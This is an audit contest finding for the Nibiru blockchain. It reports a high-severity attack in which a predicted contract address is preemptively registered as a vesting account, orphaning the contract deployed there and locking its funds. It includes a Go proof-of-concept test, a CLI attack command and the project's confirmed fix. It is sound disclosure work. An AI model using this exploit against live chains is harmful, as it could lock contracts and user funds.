# Nibiru C4 H-01: Vesting account preemption attack preventing future contract deployment

- Source bundle: `report.md`
- Contest: `2024-11-nibiru`
- Contest start: `2024-11-12`
- Contest end: `2024-11-26`
- Original severity: `High`
- Corpus ID: `nibiru-c4-2024-11-h01-vesting-account-preemption`

---

## [[H-01] Vesting account preemption attack preventing future contract deployment](https://github.com/code-423n4/2024-11-nibiru-findings/issues/60)
*Submitted by [gh8eo](https://github.com/code-423n4/2024-11-nibiru-findings/issues/60)*

This vulnerability allows an attacker to preemptively set a target address as a vesting account, permanently blocking contract deployments by Factory contracts or other users to that address. Once the address is marked as a vesting account, any deployment attempt stores the contract bytecode in the state without creating a `codeHash`, rendering the contract permanently inaccessible.

For example, an attacker could target critical ecosystem addresses, such as those planned for LayerZero or Uniswap, and preemptively mark them as vesting accounts. This would effectively “orphan” the contract bytecode at these addresses, with no way to interact with or access it. The severity is compounded if funds are deployed with the contract, as these would also be irretrievable.

If exploited, this vulnerability allows an attacker to lock up critical addresses by setting them as vesting accounts, resulting in “lost” contracts with unreachable bytecode and permanently inaccessible funds. For ecosystem-critical contracts or high-value deployments, this could disrupt functionality and lead to substantial, irreversible losses.

### Proof of Concept

The following commit demonstrates the vulnerability through a step-by-step exploit:

- Commit [link](https://github.com/zsystm/nibiru-fork-for-audit/commit/9ea38e3e3a6bbc64bcbbd4271ca0f825d3a0259a) (private repo)
- Description: Key aspects of this vulnerability are demonstrated in `TestVestingAccountPreemptionAttack`, which provides a proof of concept for the vulnerability in the form of a test scenario.

Please provide your GitHub handles, and I will grant access to the private repository. For quick reference before access permissions are granted, I’ve included a core snippet of the reproduction code below.

<details>

```go
func (s *Suite) TestVestingAccountPreemptionAttack() {
	deps := evmtest.NewTestDeps()
	// Step-1: Set up the deterministic victim account
	privKeyE, _ := crypto.HexToECDSA("46e86cbf25a9aeb0630feebbb4ec22d6ee7acbdbde8b54d0382112c9b0cfe37c")
	privKey := &ethsecp256k1.PrivKey{
		Key: crypto.FromECDSA(privKeyE),
	}
	ethAddr := crypto.PubkeyToAddress(privKeyE.PublicKey)
	deps.Sender = evmtest.EthPrivKeyAcc{
		EthAddr:       ethAddr,
		NibiruAddr:    eth.EthAddrToNibiruAddr(ethAddr),
		PrivKey:       privKey,
		KeyringSigner: evmtest.NewSigner(privKey),
	}
	victim := deps.Sender
	fundedAmount := evm.NativeToWei(big.NewInt(100))
	fundedCoin := sdk.NewCoins(sdk.NewCoin("unibi", sdk.NewIntFromBigInt(fundedAmount)))
	s.Require().NoError(testapp.FundModuleAccount(deps.App.BankKeeper, deps.Ctx, authtypes.FeeCollectorName, fundedCoin))
	s.Require().NoError(testapp.FundAccount(deps.App.BankKeeper, deps.Ctx, victim.NibiruAddr, fundedCoin))
	// Step-2: Victim account deploys a Factory contract
	gasLimit := big.NewInt(3_000_000)
	initialFundAmt := int64(10)
	initialFundToFactory := evm.NativeToWei(big.NewInt(initialFundAmt))
	createArgs := evmtest.ArgsCreateContract{
		EthAcc:        victim,
		EthChainIDInt: deps.EvmKeeper.EthChainID(deps.Ctx),
		GasPrice:      big.NewInt(1),
		Nonce:         deps.StateDB().GetNonce(victim.EthAddr),
		GasLimit:      gasLimit,
		// Factory send 999 wei when deploy Child contract. See x/evm/embeds/contracts/Factory.sol
		Value: initialFundToFactory,
	}
	ethTxMsg, err := evmtest.DeployFactoryMsgEthereumTx(createArgs)
	s.Require().NoError(err)
	s.Require().NoError(ethTxMsg.ValidateBasic())
	s.Equal(ethTxMsg.GetGas(), gasLimit.Uint64())
	resp, err := deps.App.EvmKeeper.EthereumTx(sdk.WrapSDKContext(deps.Ctx), ethTxMsg)
	s.Require().NoError(
		err,
		"resp: %s\nblock header: %s",
		resp,
		deps.Ctx.BlockHeader().ProposerAddress,
	)
	s.Require().Empty(resp.VmError)
	// Check if the Factory contract is deployed
	factoryAddr := crypto.CreateAddress(gethcommon.HexToAddress(victim.EthAddr.String()), 0)
	factoryContractAcc := deps.App.EvmKeeper.GetAccount(deps.Ctx, factoryAddr)
	s.Require().NotNil(factoryContractAcc)
	s.Require().True(factoryContractAcc.IsContract())
	codeHash := crypto.Keccak256Hash(embeds.SmartContract_Factory.DeployedBytecode)
	s.Require().Equal(embeds.SmartContract_Factory.DeployedBytecode, deps.App.EvmKeeper.GetCode(deps.Ctx, codeHash))
	factoryBal := deps.App.BankKeeper.GetBalance(deps.Ctx, eth.EthAddrToNibiruAddr(factoryAddr), "unibi")
	s.Require().Equal(initialFundAmt, factoryBal.Amount.Int64())
	// Step-3: Attacker set expected Child contract address as vesting account
	attacker := evmtest.NewEthPrivAcc()
	err = testapp.FundAccount(
		deps.App.BankKeeper,
		deps.Ctx,
		attacker.NibiruAddr,
		sdk.NewCoins(sdk.NewInt64Coin("unibi", 100000000)),
	)
	// NOTE: factory does not create any child contract yet, so the expected child address is 1
	expectedChildAddr := crypto.CreateAddress(factoryAddr, 1)
	var msgServer vestingtypes.MsgServer
	msgServer = vesting.NewMsgServerImpl(deps.App.AccountKeeper, deps.App.BankKeeper)
	lockedCoin := sdk.NewInt64Coin("unibi", 100)
	lockResp, err := msgServer.CreatePermanentLockedAccount(deps.Ctx, vestingtypes.NewMsgCreatePermanentLockedAccount(
		attacker.NibiruAddr,
		eth.EthAddrToNibiruAddr(expectedChildAddr),
		sdk.Coins{lockedCoin},
	))
	s.Require().NoError(err)
	s.Require().NotNil(lockResp)
	// Attacker successfully created a locked account with the expected child address
	// Step-4: Victim tries to deploy a child contract
	input, err := embeds.SmartContract_Factory.ABI.Pack("makeChild")
	s.Require().NoError(err)
	execArgs := evmtest.ArgsExecuteContract{
		EthAcc:          victim,
		EthChainIDInt:   deps.EvmKeeper.EthChainID(deps.Ctx),
		ContractAddress: &factoryAddr,
		Data:            input,
		GasPrice:        big.NewInt(1),
		Nonce:           deps.StateDB().GetNonce(victim.EthAddr),
		GasLimit:        gasLimit,
	}
	ethTxMsg, err = evmtest.ExecuteContractMsgEthereumTx(execArgs)
	s.Require().NoError(err)
	s.Require().NoError(ethTxMsg.ValidateBasic())
	s.Equal(ethTxMsg.GetGas(), gasLimit.Uint64())
	_, err = deps.App.EvmKeeper.EthereumTx(sdk.WrapSDKContext(deps.Ctx), ethTxMsg)
	s.Require().NoError(err)
	// PROOF OF IMPACTS
	// IMPACT-1(orphan contract): bytecode actually deployed but code hash is not set for the account because
	// the account's type is not EthAccountI, so it's not accessible.
	childAcc := deps.App.EvmKeeper.GetAccount(deps.Ctx, expectedChildAddr)
	s.Require().Equal(evm.EmptyCodeHash, childAcc.CodeHash)
	// IMPACT-2(storage waste): bytecode deployed but no code hash, so the storage is wasted.
	childCodeHash := crypto.Keccak256Hash(embeds.SmartContract_Child.DeployedBytecode)
	childCode := deps.App.EvmKeeper.GetCode(deps.Ctx, childCodeHash)
	s.T().Logf("storage waste: %d bytes", len(childCode))
	// IMPACT-3(locked fund): There are no way to access the locked fund because the account is not EthAccountI.
	acc := deps.App.AccountKeeper.GetAccount(deps.Ctx, eth.EthAddrToNibiruAddr(expectedChildAddr))
	_, ok := acc.(exported.VestingAccount)
	s.Require().True(ok)
	input, err = embeds.SmartContract_Child.ABI.Pack("withdraw")
	s.Require().NoError(err)
	// victim tries to withdraw the locked fund, but contract is orphan so no actual state transition happens
	execArgs = evmtest.ArgsExecuteContract{
		EthAcc:          victim,
		EthChainIDInt:   deps.EvmKeeper.EthChainID(deps.Ctx),
		ContractAddress: &expectedChildAddr,
		Data:            input,
		GasPrice:        big.NewInt(1),
		Nonce:           deps.StateDB().GetNonce(attacker.EthAddr),
		GasLimit:        gasLimit,
	}
	ethTxMsg, err = evmtest.ExecuteContractMsgEthereumTx(execArgs)
	s.Require().NoError(err)
	// No actual state transition happens.
	// Proof: Debug with breakpoints at https://github.com/NibiruChain/go-ethereum/blob/7fb652f186b09b81cce9977408e1aff744f4e3ef/core/vm/evm.go#L217-L219
	// code is nil, so just return without executing the contract
	deps.App.EvmKeeper.EthereumTx(sdk.WrapSDKContext(deps.Ctx), ethTxMsg)
}
```

</details>

### Test Code Walkthrough

1. A victim account is created, which deploys a factory contract along with a small fund (lines 244\~289).
	-  The factory contract deploys each child contract with 999 wei, so it requires a minimal balance. For further details, see `x/evm/embeds/contracts/Factory.sol`.
2. Verify that the factory contract has been successfully deployed (lines 291–298).
3. Next, the attacker starts the preemption attack. The attacker anticipates the address of the child contract that the factory will deploy next. This is possible because the address generation for contracts is deterministic, based on the deployer’s address and nonce (line 309).
4. The attacker creates a `PermanentLockedAccount` at the anticipated child contract address (lines 313–319). This immediately disrupts the normal functionality of the first future child deployed by the factory. If the attacker creates vesting accounts across multiple nonces within a for loop, this would effectively block **any future child contract** deployments by the factory. The following steps demonstrate the resulting impacts.
5. Attempt to deploy a child by calling `makeChild` on the factory contract (lines 322–339). The transaction to deploy the child succeeds, but something has gone wrong.
6. **Impact 1**: Although the bytecode has been stored in the state, no `codeHash` is mapped to the account. This is due to the internal logic in [`SetAccount`](https://github.com/NibiruChain/nibiru/blob/f3cbcaec58f23c54f6b75204b0c4009856b47250/x/evm/keeper/statedb.go#L114-L116), where the `codeHash` is only set if the account implements `EthAccountI`. Because the account here is a `PermanentLockedAccount`, the `codeHash` is not set. With no mapping between the contract address and the `codeHash`, the deployed bytecode is permanently inaccessible.
7. **Impact 2**: Since the bytecode is permanently inaccessible, it wastes storage space in the state. In this PoC, the Child contract bytecode occupies 1,401 bytes, leading to 1,401 bytes of wasted storage.
8. **Impact 3**: When the factory contract deploys a child, it transfers 999 wei to the new contract. To retrieve these funds, the withdraw function on the child contract should be called. However, because no `codeHash` exists in the state for the child contract’s address, it is inaccessible. As a result, these funds are permanently locked. If this attack targeted large-scale contracts that deploy children with substantial amounts of funds, the potential loss could be significant.

### Manual Reproduce

- Set victim account with the private key `46e86cbf25a9aeb0630feebbb4ec22d6ee7acbdbde8b54d0382112c9b0cfe37c`.
- Deploy factory contract using victim account.
- Execute attack command: `nibid tx vesting create-permanent-locked-account nibi136uvp9vz8qplx4rc32fpju5natuacvvgau96c6 10unibi --from attacker`.
    - Ensure the target address is the expected child address of factory contract.
- Attempt to call `Child.withdraw` from victim account. No state transition will occur, and no funds will be retrievable due to the missing `codeHash`.

### Recommended mitigation steps

There are two potential approaches for patching this vulnerability: a fundamental patch and a more practical one.

The fundamental approach involves completely separating the Cosmos address system from the EVM address system. Currently, the bytes of an EVM address are directly used as Cosmos addresses, allowing them to share state, which enables this vulnerability. By fully decoupling these address systems, this issue could be prevented entirely. However, this would require a major design overhaul and is thus not a realistic solution.

The more practical approach is to disable the Vesting Account feature at the ante handler level. While this would prevent the use of vesting features, it is likely a necessary trade-off for security reasons.

**[Unique-Divine (Nibiru) confirmed and commented](https://github.com/code-423n4/2024-11-nibiru-findings/issues/60#issuecomment-2520085218):**
 > I think this one's a nice finding. Impact 3 is not so much a factor since you can only do this attack prior to the deployment of a contract. It's a bit of an edge case because it assumes the deployer's opting for a deterministic address.
> 
> Mitigation for us would be a simple removal of each of the "auth/vesting" transaction messages, because we don't even use that module and all vesting is managed by Wasm contracts 

**Nibiru mitigated:**
> [PR-2127](https://github.com/NibiruChain/nibiru/pull/2127) - Disabled built in auth/vesting module functionality.

**Status:** Mitigation confirmed. 
***
